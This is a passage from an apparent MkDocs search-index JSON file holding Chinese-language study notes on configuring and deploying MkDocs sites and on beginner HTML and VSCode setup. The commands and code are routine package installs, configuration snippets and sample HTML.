<p>\u5f53\u7136\uff0c\u5982\u679c\u4f60\u4e0d\u60f3\u4f7f\u7528 MkDocs \u7684\u9ed8\u8ba4\u76ee\u5f55\uff0c\u90a3\u4e48\u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u00a0<code>docs_dir</code>\u00a0\u9009\u9879\u6765\u6307\u5b9a\u5bf9\u5e94\u7684\u6587\u4ef6\u5939\u540d\u79f0\u3002\u4f46\u901a\u5e38\u60c5\u51b5\u6211\u4eec\u90fd\u4e0d\u9700\u8981\u8fdb\u884c\u4fee\u6539\u5c31\u5df2\u7ecf\u80fd\u6ee1\u8db3\u6211\u4eec\u7684\u57fa\u672c\u9700\u8981\u4e86\u3002</p>"},{"location":"out_class_learning/quickly_learning/MkDocs%20%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/#_3","title":"\u4f7f\u7528\u6269\u5c55\u548c\u4e3b\u9898","text":"<p>\u57fa\u672c\u4e0a\u6211\u4eec\u53ea\u9700\u8981\u5c06\u7ad9\u70b9\u4fe1\u606f\u548c\u6587\u6863\u8def\u5f84\u5728\u00a0<code>mkdocs.yml</code>\u00a0\u6587\u4ef6\u4e2d\u586b\u5199\u597d\u5c31\u5df2\u7ecf\u53ef\u4ee5\u8fd0\u884c MkDocs \u4e86\u3002\u4e0d\u8fc7 MkDocs \u4e3a\u4f7f\u7528\u8005\u9884\u7559\u4e86\u53ef\u6269\u5c55\u7684\u914d\u7f6e\uff0c\u65b9\u4fbf\u4f7f\u7528\u8005\u53bb\u6dfb\u52a0\u5176\u4ed6\u5f00\u53d1\u8005\u6240\u5f00\u53d1\u7684\u4e3b\u9898\u3001\u6269\u5c55\u7b49\u529f\u80fd\u3002</p> <ul> <li>Markdown \u6269\u5c55</li> </ul> <p>MkDocs \u4f7f\u7528\u00a0Python-Markdown\u00a0\u5e93\uff08Markdown \u89c4\u8303\u7684 Python \u5b9e\u73b0\uff09\u6765\u6e32\u67d3 Markdown \u5185\u5bb9\uff0c\u56e0\u6b64 MkDocs \u4e2d\u5bf9\u4e8e Markdown \u5185\u5bb9\u6e32\u67d3\u7684\u6269\u5c55\u4e5f\u662f\u6765\u81ea\u4e8e\u6b64\u3002\u6211\u4eec\u53ef\u4ee5\u5728 Python-Markdown \u7684\u00a0\u5b98\u65b9\u6587\u6863\u00a0\u4e2d\u6d4f\u89c8\u5230\u76ee\u524d\u6240\u652f\u6301\u7684 Markdown \u6269\u5c55\u6709\u54ea\u4e9b\u3002</p> <p>\u6bd4\u5982\u6211\u5728\u5f53\u4e2d\u5f00\u542f\u5bf9\u4e8e Markdown \u5185\u5bb9\u6807\u9898\u7684\u56fa\u5b9a\u6807\u8bc6\u7b26\u3001\u811a\u6ce8\u4ee5\u53ca\u8868\u683c\uff1a</p> <pre><code>markdown_extensions:\n  - toc:\n      permalink: True\n  - footnotes\n  - tables\n</code></pre> <p>\u9664\u6b64\u4e4b\u5916\uff0cPython-Markdown \u8fd8\u652f\u6301\u4e00\u4e9b\u6765\u81ea\u4e8e\u7b2c\u4e09\u65b9\u7684 Markdown \u6269\u5c55\uff0c\u4f60\u80fd\u5728 Python-Markdown \u7684 Github \u4ed3\u5e93\u4e2d\u7684\u00a0Wiki\u00a0\u9875\u9762\u627e\u5230\u7b26\u5408\u4f60\u9700\u8981\u7684\u6269\u5c55\uff0c\u6bd4\u5982\u652f\u6301\u6570\u5b66\u516c\u5f0f\u3001emoji \u8868\u60c5\u3001\u589e\u5f3a Markdown \u8bed\u6cd5\u7b49\u3002</p> <p>\u4f46\u8fd9\u4e9b\u7b2c\u4e09\u65b9\u6269\u5c55\u90fd\u8fd8\u662f\u9700\u8981\u901a\u8fc7\u00a0<code>pip</code>\u5de5\u5177\uff08\u5b89\u88c5 Python \u89e3\u91ca\u5668\u65f6\u4f1a\u81ea\u5e26\uff09\u6765\u8fdb\u884c\u5b89\u88c5\uff0c\u5b89\u88c5\u4e4b\u540e\u5728\u00a0<code>mkdocs.yml</code>\u4e2d\u7684<code>markdown_extension</code>\u90e8\u5206\u7ee7\u7eed\u8ffd\u52a0\u3002</p> <p>\u8fd9\u91cc\u6211\u4e0b\u8f7d\u4e86\u4e00\u4e2a\u540d\u4e3a\u00a0<code>markdown-checklist</code>\u7684\u6269\u5c55\uff0c\u4f7f\u6211\u7684 Markdown \u6587\u6863\u5185\u5bb9\u652f\u6301\u6e05\u5355\u5217\u8868\u7684\u9884\u89c8\u6837\u5f0f\u3002</p> <pre><code>pip install markdown-checklist\n</code></pre> <p>\u5b89\u88c5\u5b8c\u6210\u540e\u5c06\u5176\u6dfb\u52a0\u5230\u00a0<code>markdown_extension</code>\u00a0\u4e2d\uff0c\u6ce8\u610f\uff0c\u8fd9\u91cc\u662f\u9700\u8981\u5b89\u88c5\u63d2\u4ef6\u5bf9\u5e94\u6587\u6863\u7684\u540d\u79f0\u6765\u586b\u5199\u5305\u542b\u76f8\u5e94\u7684\u00a0<code>makeExtension</code>\u00a0\u5c5e\u6027\u7684\u6a21\u5757\u6216\u7ee7\u627f\u4e86 Markdown \u5e93\u4e2d\u00a0<code>Extension</code>\u00a0\u7684\u7c7b\uff0c\u6240\u4ee5\u6211\u5c31\u586b\u5165\u4e86\u00a0<code>markdown_checklist.extension</code>\u00a0\u8fd9\u4e00\u6a21\u5757\uff1a</p> <pre><code>markdown_extensions:\n  - toc:\n      permalink: True\n  - footnotes\n  - tables\n  - markdown_checklist.extension\n</code></pre> <p>\u6700\u540e\u8fd0\u884c MkDocs \u540e\u5c31\u53ef\u4ee5\u770b\u5230\u5176\u5bf9\u5e94\u7684\u6548\u679c\u4e86\u3002</p> <ul> <li>\u4e3b\u9898\u6837\u5f0f\u7f8e\u5316</li> </ul> <p>\u5982\u679c\u4e0d\u8ffd\u6c42\u60ca\u8273\u7684\u89c6\u89c9\u6548\u679c\uff0cMkDocs \u9ed8\u8ba4\u7684\u4e3b\u9898\u5df2\u7ecf\u76f8\u5f53\u7b80\u7ea6\u7f8e\u89c2\u4e86\u3002</p> <p>\u4e0d\u8fc7\uff0c\u5982\u679c\u4f60\u6709\u4e00\u5b9a\u7684 HTML\u3001CSS \u4ee5\u53ca JavaScript \u57fa\u7840\uff0c\u5bf9 MkDocs \u9ed8\u8ba4\u7684\u4e3b\u9898\u6837\u5f0f\u5b58\u5728\u67d0\u4e9b\u60f3\u8981\u5b9a\u5236\u5316\u7684\u90e8\u5206\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u00a0<code>extra_templates</code>\u3001<code>extra_css</code>\u00a0\u548c\u00a0<code>extra_javascript</code>\u00a0\u4e09\u4e2a\u9009\u9879\u6765\u8fdb\u884c\u5c40\u90e8\u8c03\u6574\u3002\u54ea\u6015\u4f60\u662f\u60f3\u4ece\u5934\u5230\u5c3e\u81ea\u5df1\u5b9a\u5236\u4e00\u5957\u4e3b\u9898\u6837\u5f0f\uff0c\u90a3\u4e48 MkDocs \u4e5f\u80fd\u5982\u4f60\u6240\u613f\uff0c\u8fd8\u6709\u00a0\u4e13\u95e8\u7684\u6587\u6863\u00a0\u6765\u6307\u5bfc\u4f60\u5982\u4f55\u53bb\u64cd\u4f5c\u3002</p> <p>\u5f53\u7136\uff0c\u66f4\u591a\u65f6\u5019\u6211\u4eec\u4f1a\u5e0c\u671b\u76f4\u63a5\u5957\u7528\u522b\u4eba\u5b9a\u5236\u597d\u7684\u4e3b\u9898\u3002\u5bf9\u6b64\uff0c\u4f60\u540c\u6837\u53ef\u4ee5\u5728 MkDocs \u7684 Github \u4ed3\u5e93\u4e2d\u7684\u00a0Wiki\u00a0\u9875\u9762\u4e2d\u627e\u5230\u4f60\u5fc3\u4eea\u7684\u4e3b\u9898\u6837\u5f0f\u3002</p> <p>\u65e0\u8bba\u662f\u81ea\u5df1\u5b9a\u5236\u8fd8\u662f\u4f7f\u7528\u7b2c\u4e09\u65b9\u7684\u4e3b\u9898\u6837\u5f0f\uff0c\u60f3\u8981\u4e3b\u9898\u6837\u5f0f\u751f\u6548\uff0c\u6700\u540e\u90fd\u9700\u8981\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u00a0<code>theme</code>\u00a0\u9879\u6765\u8fdb\u884c\u914d\u7f6e\u3002</p> <p>\u6bd4\u5982\u6211\u8fd9\u91cc\u4f7f\u7528\u4e86\u76ee\u524d\u4f7f\u7528\u5ea6\u6700\u5e7f\u6cdb\u7684 MkDocs \u7b2c\u4e09\u65b9\u4e3b\u9898\u6837\u5f0f\u00a0Material for MkDocs\uff0c\u4f7f\u5f97 MkDocs \u80fd\u591f\u4ee5 Google \u63a8\u884c\u7684 Material Design \u98ce\u683c\u5448\u73b0\u3002</p> <p>\u4f46\u56e0\u4e3a\u8be5\u4e3b\u9898\u5c5e\u4e8e\u7b2c\u4e09\u65b9\u4e3b\u9898\u6837\u5f0f\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528\u524d\u9762\u5b89\u88c5 MkDocs \u4f7f\u7528\u7684\u00a0<code>pip</code>\u00a0\u5de5\u5177\u8fdb\u884c\u5b89\u88c5\uff1a</p> <pre><code>pip install mkdocs-material\n</code></pre> <p>\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5728\u00a0<code>mkdocs.yml</code>\u00a0\u6587\u4ef6\u4e2d\u8fdb\u884c\u914d\u7f6e\u5373\u53ef\uff1a</p> <pre><code>theme:\n\n  name: material\n</code></pre> <p>\u4e4b\u540e\u6211\u4eec\u5c31\u80fd\u5f97\u5230\u4e00\u4e2a Material Design \u98ce\u683c\u7684 MkDocs \u7ad9\u70b9\u4e86\uff0c\u8fd9\u4e2a\u7ad9\u70b9\u751a\u81f3\u8fd8\u6709\u81ea\u9002\u5e94\u7684\u6697\u9ed1\u6a21\u5f0f\uff08Dark Mode\uff09\u3002</p>"},{"location":"out_class_learning/quickly_learning/MkDocs%20%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/#_4","title":"\u7ad9\u70b9\u751f\u6210\u4e0e\u90e8\u7f72","text":"<p>\u5982\u679c\u4f60\u53ea\u662f\u4e34\u65f6\u7528\u4e8e\u79bb\u7ebf\u6d4f\u89c8\u6587\u6863\uff0c\u90a3\u4e48\u4f7f\u7528\u00a0<code>mkdocs serve</code>\u00a0\u547d\u4ee4\u5176\u5b9e\u8db3\u77e3\uff1b\u4f46\u5982\u679c\u4f60\u662f\u6253\u7b97\u4f5c\u4e3a\u4e2a\u4eba\u7ad9\u70b9\u6216\u4e3b\u9875\u90e8\u7f72\u5230\u4e91\u670d\u52a1\u5668\uff0c\u90a3\u4e48\u4f60\u5c31\u9700\u8981\u5c06\u6574\u4e2a\u6587\u6863\u9879\u76ee\u7f16\u8bd1\u6253\u5305\uff0c\u6700\u540e\u653e\u5230\u5bf9\u5e94\u7684\u670d\u52a1\u5668\u4e0a\u90e8\u7f72\u3002</p> <p>\u8fd9\u91cc MkDocs \u7ed9\u6211\u4eec\u63d0\u4f9b\u4e86\u4e24\u4e2a\u9009\u9879\uff1a\u4e00\u4e2a\u662f\u4f7f\u7528\u00a0<code>mkdocs build</code>\u00a0\u547d\u4ee4\u5c06\u9879\u76ee\u6253\u5305\u4e4b\u540e\uff0c\u518d\u7531\u4e2a\u4eba\u5c06\u6253\u5305\u6587\u4ef6\u4e0a\u4f20\u81f3\u670d\u52a1\u5668\u5bf9\u5e94\u7684\u76ee\u5f55\u4e0b\u8fdb\u884c\u90e8\u7f72\uff1b\u53e6\u5916\u4e00\u4e2a\u5c31\u662f\u5982\u679c\u4f60\u6709\u6253\u7b97\u4f7f\u7528\u00a0Github Pages\u00a0\u6765\u4f5c\u4e3a\u5c55\u793a\u7684\u7ad9\u70b9\uff08\u53c2\u89c1\u00a0GitHub Pages \u642d\u5efa\u6559\u7a0b\uff09\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ea\u9700\u8981\u4f7f\u7528\u00a0<code>mkdocs gh-deploy</code>\u00a0\u8fd9\u4e00\u6761\u547d\u4ee4\u5c31\u53ef\u4ee5\u5e2e\u6211\u4eec\u5b8c\u6210\u90e8\u7f72\u4efb\u52a1\u3002</p> <p>\u8be5\u547d\u4ee4\u7684\u8fc7\u7a0b\u4e3b\u8981\u662f\u5148\u5c06\u7f16\u8bd1\u6253\u5305\u597d\u7684\u76f8\u5173\u8d44\u6e90\u6587\u4ef6\uff08\u5982 HTML \u9875\u9762\u3001\u6837\u5f0f\u3001\u9759\u6001\u8d44\u6e90\u56fe\u7247\u3001\u7528\u4e8e\u4ea4\u4e92\u7684 JavaScript \u7b49\uff09\u4e0a\u4f20\u81f3\u5bf9\u5e94\u4e2a\u4eba Github \u7528\u6237\u540d\u7684 Github Pages \u4ed3\u5e93\u4e2d\uff0c\u7136\u540e\u518d\u5229\u7528\u00a0GitHub Actions\u00a0\u6765\u4fdd\u6301\u7ad9\u70b9\u6d3b\u8dc3\u3002</p> <p>\u8fd9\u6837\u6211\u4eec\u6bcf\u6b21\u53ea\u9700\u8981\u5728\u672c\u5730\u66f4\u65b0\u5185\u5bb9\u4e4b\u540e\uff0c\u901a\u8fc7\u8be5\u547d\u4ee4\u8fdb\u884c\u63d0\u4ea4\u3001\u90e8\u7f72\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u6587\u6863\u5185\u5bb9\u7684\u66f4\u65b0\u3002</p> <p>\u6ce8\uff1a\u7531\u4e8e Github Actions \u8fd0\u4f5c\u9700\u8981\u4e00\u5b9a\u65f6\u95f4\uff08\u5927\u7ea6\u5728\u51e0\u5206\u949f\u5230\u5341\u5206\u949f\u4e0d\u7b49\uff09\uff0c\u56e0\u6b64\u90e8\u7f72\u5b8c\u6210\u540e\u4f60\u9700\u8981\u7b49\u5f85\u4e00\u4f1a\u513f\u624d\u80fd\u770b\u5230 Github Pages \u751f\u6548\uff0c\u5426\u5219\u4f1a\u51fa\u73b0 404 \u9519\u8bef\u3002</p>"},{"location":"out_class_learning/quickly_learning/MkDocs%20%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/#_5","title":"\u7ed3\u8bed","text":"<p>\u5bf9\u7a0b\u5e8f\u5458\u6765\u8bf4\uff0c\u5927\u90e8\u5206\u65f6\u95f4\u90fd\u82b1\u5728\u4e86\u5199\u6587\u6863\u548c Debug \u4e0a\u3002Bug \u53ef\u4ee5\u901a\u8fc7\u76f8\u5e94\u5de5\u5177\u6765\u6162\u6162\u6392\u67e5\u5e76\u901a\u8fc7\u5c11\u91cf\u4ee3\u7801\u53bb\u89e3\u51b3\uff0c\u4f46\u9664\u4e86\u81ea\u52a8\u751f\u6210\u7684\u6587\u6863\u4e4b\u5916\uff0c\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\u90fd\u5fc5\u987b\u8981\u4eba\u4e3a\u64b0\u5199\u3002\u53ef\u5185\u5bb9\u5199\u51fa\u6765\u662f\u4e00\u56de\u4e8b\uff0c\u5c55\u793a\u5f97\u662f\u5426\u59a5\u5f53\u53c8\u662f\u53e6\u5916\u4e00\u56de\u4e8b\u3002</p> <p>\u4f7f\u7528 MkDocs \u5c31\u50cf Markdown \u4e00\u6837\uff0c\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u80fd\u591f\u51cf\u5c11\u4f7f\u7528\u8005\u5185\u5bb9\u6392\u7248\u6216\u5c55\u793a\u7684\u6837\u5f0f\u7ec6\u8282\u7684\u987e\u8651\uff0c\u800c\u8ba9\u4f7f\u7528\u8005\u80fd\u66f4\u52a0\u4e13\u6ce8\u4e8e\u8bb0\u5f55\u6216\u5199\u4f5c\u7684\u5185\u5bb9\u672c\u8eab\u3002</p> <p>\u5173\u4e8e MkDocs \u7684\u66f4\u591a\u5185\u5bb9\u672c\u6587\u5e76\u6ca1\u6709\u8fdb\u4e00\u6b65\u5c55\u5f00\uff0c\u4f46\u5982\u679c\u4f60\u6709\u5174\u8da3\u6216\u6709\u9700\u8981\uff0c\u53ef\u4ee5\u5230 MkDocs \u7684 Github\u00a0Wiki\u00a0\u9875\u9762\u8fdb\u4e00\u6b65\u63a2\u7d22 MkDocs \u751f\u6001\u3002</p>"},{"location":"out_class_learning/quickly_learning/%E4%B8%89%E5%B0%8F%E6%97%B6%E5%89%8D%E7%AB%AF%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/","title":"\u4e09\u5c0f\u65f6\u524d\u7aef\u5feb\u901f\u5165\u95e8","text":"<p>resource: https://www.bilibili.com/video/BV1BT4y1W7Aw by \u7f57\u5927\u5bccBigrich @bilibili</p>"},{"location":"out_class_learning/quickly_learning/%E4%B8%89%E5%B0%8F%E6%97%B6%E5%89%8D%E7%AB%AF%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/#_2","title":"\u524d\u7aef\u7b80\u4ecb","text":"<p>\u524d\u7aef\u65e0\u5904\u4e0d\u7528\uff0c\u5165\u95e8\u95e8\u69db\u4f4e\uff0c\u89c1\u6548\u5feb\uff0c\u662f\u8f6c\u7801\u7684\u6700\u4f73\u9009\u62e9\u3002</p> <p>\u7f51\u9875\u53f3\u952e-&gt;\u67e5\u770b\u6e90\u4ee3\u7801\uff08\u6216\u6309\u5feb\u6377\u952e H12\uff09\u6253\u5f00\u5f00\u53d1\u8005\u5de5\u5177\uff0c\u80fd\u770b\u5230\u4e0d\u540c\u9875\u9762\u5143\u7d20\u5bf9\u5e94\u7684\u4ee3\u7801\u5757\u3002</p> <p>\u524d\u7aef\u662f\u6784\u5efa\u7f51\u9875\u7684\u4e00\u90e8\u5206\uff0c\u8d1f\u8d23\u7528\u6237\u5728\u6d4f\u89c8\u5668\u4e2d\u770b\u5230\u548c\u4e0e\u4e4b\u4ea4\u4e92\u7684\u5185\u5bb9\uff1b\u800c\u7f51\u9875\u662f\u5728\u6d4f\u89c8\u5668\u4e2d\u5448\u73b0\u5185\u5bb9\u7684\u6587\u6863\u6216\u9875\u9762\u3002\u901a\u5e38\u7f51\u9875\u662f\u4f7f\u7528 HTML\u3001CSS\u3001JavaScript (JS) \u7ec4\u6210\u3002HTML \u5b9a\u4e49\u4e86\u9875\u9762\u7684\u7ed3\u6784\u548c\u5185\u5bb9\uff0c\u5305\u62ec\u6587\u672c\u3001\u56fe\u50cf\u3001\u94fe\u63a5\uff1bCSS \u7528\u4e8e\u5b9a\u4e49\u9875\u9762\u7684\u6837\u5f0f\u548c\u5e03\u5c40\uff0c\u5f00\u53d1\u8005\u5de5\u5177\u53f3\u680f Styles\uff08\u6837\u5f0f\uff09\u7b49\u5c31\u662f CSS \u4ee3\u7801\uff1bJS \u7528\u4e8e\u6dfb\u52a0\u4ea4\u4e92\u6027\u548c\u52a8\u6001\u529f\u80fd\u4f5c\u7528\u3002</p>"},{"location":"out_class_learning/quickly_learning/%E4%B8%89%E5%B0%8F%E6%97%B6%E5%89%8D%E7%AB%AF%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/#vscode","title":"\u5b89\u88c5 VSCode \u5f00\u53d1\u73af\u5883","text":"<p>\u4e0b\u8f7d\u5e76\u5b89\u88c5 VSCode\uff0c\u8fd0\u884c\u4e4b\u3002</p> <p>\u5de6\u4fa7\u680f extensions -&gt; \u641c\u7d22 Chinese -&gt; \u5b89\u88c5\u8bed\u8a00\u5305\uff0c\u5b89\u88c5\u5b8c\u540e\u91cd\u542f VSCode.</p> <p>\u5de6\u4fa7\u680f extensions -&gt; \u641c\u7d22 HTML CSS Support -&gt; \u5b89\u88c5\uff0c\u7528\u4e8e\u5199 CSS.</p> <p>\u5de6\u4fa7\u680f extensions -&gt; \u641c\u7d22 Live Server -&gt; \u5b89\u88c5\uff0c\u7528\u4e8e\u5728\u6d4f\u89c8\u5668\u4e2d\u5b9e\u65f6\u9884\u89c8\u9875\u9762\u53d8\u5316\u3002</p> <p>\u5de6\u4fa7\u680f extensions -&gt; \u641c\u7d22 Auto Rename Tag -&gt; \u5b89\u88c5\uff0c\u5176\u53ef\u4ee5\u8ba9\u4f60\u5728\u4fee\u6539 HTML \u6807\u7b7e\u7684\u65f6\u5019\uff0c\u540c\u6b65\u4fee\u6539\u4e0e\u4e4b\u5339\u914d\u7684\u53e6\u4e00\u4e2a\u6807\u7b7e\u3002</p>"},{"location":"out_class_learning/quickly_learning/%E4%B8%89%E5%B0%8F%E6%97%B6%E5%89%8D%E7%AB%AF%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/#html","title":"HTML \u7b80\u4ecb\u53ca\u73af\u5883\u642d\u5efa","text":"<p>HTML \u5168\u79f0\u4e3a hypertext markup language\uff08\u8d85\u6587\u672c\u6807\u8bb0\u8bed\u8a00\uff09\uff0c\u7528\u4e8e\u4e3a\u7f51\u9875\u63d0\u4f9b\u7ed3\u6784\uff0c\u544a\u8bc9\u6d4f\u89c8\u5668\u54ea\u4e9b\u662f\u6807\u9898\uff0c\u54ea\u4e9b\u662f\u6bb5\u843d\uff0c\u54ea\u4e9b\u662f\u5217\u8868\uff0c\u7b49\u7b49\u3002</p>"},{"location":"out_class_learning/quickly_learning/%E4%B8%89%E5%B0%8F%E6%97%B6%E5%89%8D%E7%AB%AF%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/#html_1","title":"HTML \u6807\u7b7e","text":"<p>HTML \u901a\u8fc7\u4e00\u7cfb\u5217\u7684\u6807\u7b7e\uff08\u4e5f\u79f0\u4e3a\u5143\u7d20\uff09\u6765\u901a\u8fc7\u5c5e\u6027\u63d0\u4f9b\u4fe1\u606f\uff0c\u5b9a\u4e49\u6587\u672c\u3001\u56fe\u50cf\u3001\u94fe\u63a5\u7b49\uff0cHTML \u6807\u7b7e\u662f\u7531\u5c16\u62ec\u53f7\u62ec\u8d77\u7684\u5173\u952e\u5b57\u3002</p> <p>\u6807\u7b7e\u901a\u5e38\u6210\u5bf9\u51fa\u73b0\uff0c\u5305\u62ec\u5f00\u59cb\u6807\u7b7e\u548c\u7ed3\u675f\u6807\u7b7e\uff0c\u5408\u79f0\u53cc\u6807\u7b7e\uff0c\u5185\u5bb9\u4f4d\u4e8e\u8fd9\u4e24\u4e2a\u6807\u7b7e\u4e4b\u95f4\uff0c\u4f8b\u5982\uff1a</p> <pre><code>&lt;p&gt;\u8fd9\u662f\u4e00\u4e2a\u6bb5\u843d\u3002&lt;/p&gt;\n&lt;hl&gt;\u8fd9\u662f\u4e00\u4e2a\u6807\u9898\u3002&lt;/hl&gt;\n&lt;a href=\"#\"&gt;\u8fd9\u662f\u4e00\u4e2a\u8d85\u94fe\u63a5\u3002&lt;/a&gt;\n</code></pre> <p>\u4e0d\u8fc7\u5355\u6807\u7b7e\u4e5f\u662f\u5b58\u5728\u7684\uff0c\u4f8b\u5982\uff1a</p> <pre><code>&lt;input type=\"text\"&gt;\n&lt;br&gt;\n&lt;hr&gt;\n</code></pre> <p>\u5355\u53cc\u6807\u7b7e\u7684\u5dee\u522b\u5728\u4e8e\u662f\u5426\u65e0\u6587\u672c\u5185\u5bb9\u3002</p>"},{"location":"out_class_learning/quickly_learning/%E4%B8%89%E5%B0%8F%E6%97%B6%E5%89%8D%E7%AB%AF%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/#html_2","title":"HTML \u6587\u4ef6\u7ed3\u6784","text":"<p><code>&lt;!DOCTYPE html&gt;</code> \u7528\u4e8e\u544a\u8bc9\u6d4f\u89c8\u5668\uff0c\u8fd9\u662f\u4e00\u4e2a HTML \u6587\u4ef6\u3002</p> <p><code>&lt;html&gt;&lt;/html&gt;</code> \u6807\u7b7e\u5bf9\uff0c\u662f\u8fd9\u4e2a HTML \u6587\u6863\u7684\u6839\u5143\u7d20\uff0c\u8868\u660e HTML \u6587\u6863\u7684\u8d77\u59cb\u70b9\u548c\u8fd9\u4e2a\u6587\u6863\u7684\u6700\u5916\u5c42\u5bb9\u5668\uff0c\u5305\u542b\u4e86\u6574\u4e2a\u6587\u6863\u7684\u7ed3\u6784\u3002</p> <p><code>&lt;head&gt;&lt;/head&gt;</code> \u6807\u7b7e\u5bf9\uff0c\u8868\u793a\u6587\u6863\u7684\u5934\u90e8\uff0c\u5305\u542b\u4e86\u4e00\u4e9b\u6587\u4ef6\u7684\u5143\u4fe1\u606f\uff0c\u6bd4\u5982\u6587\u6863\u7684\u6807\u9898\u3001\u6587\u4ef6\u7684\u7f16\u7801\u683c\u5f0f\u3001\u4e00\u4e9b\u5916\u90e8\u6837\u5f0f\u8868\uff08\u5305\u542b CSS \u548c JS \u6587\u4ef6\uff09\u3002</p> <p><code>&lt;body&gt;&lt;/body&gt;</code> \u6807\u7b7e\u5bf9\uff0c\u5305\u542b\u4e86\u5b9e\u9645\u663e\u793a\u5728\u6d4f\u89c8\u5668\u9875\u9762\u5185\u7684\u5185\u5bb9\u3002\u6211\u4eec\u63a5\u4e0b\u6765\u7684\u7ec3\u4e60\u90fd\u662f\u5728\u8be5\u6807\u7b7e\u5bf9\u5185\u7f16\u5199\u3002</p> <pre><code>&lt;!-- \u8fd9\u91cc\u9632\u6b62\u6587\u6863\u7684\u5143\u4fe1\u606f --&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;!-- \u8fd9\u91cc\u653e\u7f6e\u6587\u6863\u7684\u5143\u4fe1\u606f --&gt;\n    &lt;title&gt;\u6587\u6863\u6807\u9898&lt;/title&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;!-- \u94fe\u63a5\u5916\u90e8\u6837\u5f0f\u8868\u6216\u811a\u672c\u6587\u4ef6\u7b49 --&gt;\n    &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"styles.css\"&gt;\n    &lt;script src=\"script.js\"&gt;&lt;/script&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;!-- \u8fd9\u91cc\u653e\u7f6e\u9875\u9762\u5185\u5bb9 --&gt;\n    &lt;hl&gt;\u8fd9\u662f\u4e00\u4e2a\u6807\u9898\u3002&lt;/hl&gt;\n    &lt;p&gt;\u8fd9\u662f\u4e00\u4e2a\u6bb5\u843d\u3002&lt;/p&gt;\n    &lt;a href=\"https://www.example.com\"&gt;\u8fd9\u662f\u4e00\u4e2a\u8d85\u94fe\u63a5\u3002&lt;/a&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u73b0\u5728 new \u4e00\u4e2a\u6587\u4ef6\u5939\uff0cWindows \u4e0b cmd \u547d\u4ee4\u884c\uff08Win+R \u8f93\u5165 cmd \u8fdb\u5165\uff09\u8fdb\u5165\u4e4b\uff1acd `. <p>\u4f7f\u7528\u547d\u4ee4 <code>code .</code> \u4f7f\u7528 VSCode \u6253\u5f00\u5f53\u524d\u76ee\u5f55\uff0c\u5373\u5c06\u5176\u6dfb\u52a0\u5230\u5de5\u4f5c\u533a\u3002</p> <p>\u5728\u6587\u4ef6\u5939\u4e0b\u521b\u5efa\u4e00\u4e2a html \u6587\u4ef6\uff0c\u6bd4\u5982 <code>demo.html</code>/</p> <p>\u4f60\u5f53\u7136\u53ef\u4ee5\u624b\u52a8\u6253\u4e00\u904d html \u6a21\u677f\uff0c\u4e5f\u53ef\u4ee5\u5728\u7a7a\u767d\u6587\u4ef6\u5f00\u5934\u6253\u4e00\u4e2a\u6216\u4e09\u4e2a\u611f\u53f9\u53f7\u540e tab \u8865\u5168\u3002</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;demo_test&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u5728\u6587\u4ef6\u533a\u57df\u9f20\u6807\u53f3\u952e\u540e\u9009\u62e9 Open with Live Server \u5728\u6d4f\u89c8\u5668\u4e2d\u89c2\u5bdf\u6211\u4eec\u8fd9\u4e2a\u9875\u9762\u3002</p>"},{"location":"out_class_learning/quickly_learning/%E4%B8%89%E5%B0%8F%E6%97%B6%E5%89%8D%E7%AB%AF%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/#_3","title":"\u5e38\u7528\u6587\u672c\u6807\u7b7e","text":"<p>\u6807\u9898\u6807\u7b7e\uff1aHTML \u4e2d\u6807\u9898\u6807\u7b7e\u5171\u516d\u7ea7\uff0c\u5206\u522b\u4f7f\u7528\u53cc\u6807\u7b7e <code>h1</code> \u81f3 <code>h6</code>\uff0c\u663e\u7136 h \u53d6\u81ea\u6807\u9898\uff08heading\uff09\uff0c\u53e6\u5916\u8bf7\u7075\u6d3b\u4f7f\u7528 HTML \u7684 Tab \u952e\u8865\u5168\u529f\u80fd\u3002</p> <p>\uff08\u5de6\u4e0a\u89d2 -&gt; \u81ea\u52a8\u4fdd\u5b58\uff0c\u53f3\u952e\u8fd0\u884c\u7684\u65f6\u5019 -&gt; open with live server\uff0c\u5c31\u53ef\u4ee5\u5b9e\u65f6\u66f4\u65b0\u4e86\uff09</p> <p>\uff08Auto Rename Tag \u53ef\u4ee5\u8ba9\u4f60\u540c\u6b65\u4fee\u6539\u53cc\u6807\u7b7e\uff09</p> <p>\u6bb5\u843d\u6807\u7b7e\uff1a\u4f7f\u7528\u53cc\u6807\u7b7e\u4e3a <code>p</code>\uff0c\u663e\u7136 p \u53d6\u81ea\u6bb5\u843d\uff08paragraph\uff09\u3002</p> <p>\u6587\u672c\u52a0\u7c97\uff1a\u4f7f\u7528\u53cc\u6807\u7b7e 